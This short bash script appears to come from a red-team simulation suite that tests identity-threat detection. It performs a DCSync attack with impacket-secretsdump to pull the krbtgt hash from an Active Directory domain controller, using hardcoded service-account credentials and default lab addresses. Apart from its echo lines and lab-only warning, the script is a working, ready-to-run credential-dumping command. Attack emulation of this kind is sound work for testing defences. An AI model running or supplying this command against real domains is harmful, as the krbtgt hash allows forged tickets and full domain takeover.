#!/usr/bin/env bash
# T1003.006 — DCSync attempt for full credential dump
# Derived verbatim from SIM-MP-002 step step-04 (../../mp-002-kerberoast-lateral-smb.yml).
# LEGAL: run only in an authorized, isolated lab. See ../README.md.
set -u -o pipefail
echo "[SIM-MP-002/T1003.006] DCSync attempt for full credential dump"

echo '[MP-002] ITDR peak: DCSync to extract krbtgt hash';
DC_IP="${CORTEXSIM_DC_IP:-10.0.10.10}";
DOMAIN="${CORTEXSIM_DOMAIN:-cortexsim.local}";
impacket-secretsdump -just-dc-user krbtgt "$DOMAIN/sql-svc:Summer2024@$DC_IP" 2>&1 | head -5 || echo '[*] demo-mode';
echo '[*] DCSync replication triggers high-severity ITDR alert'
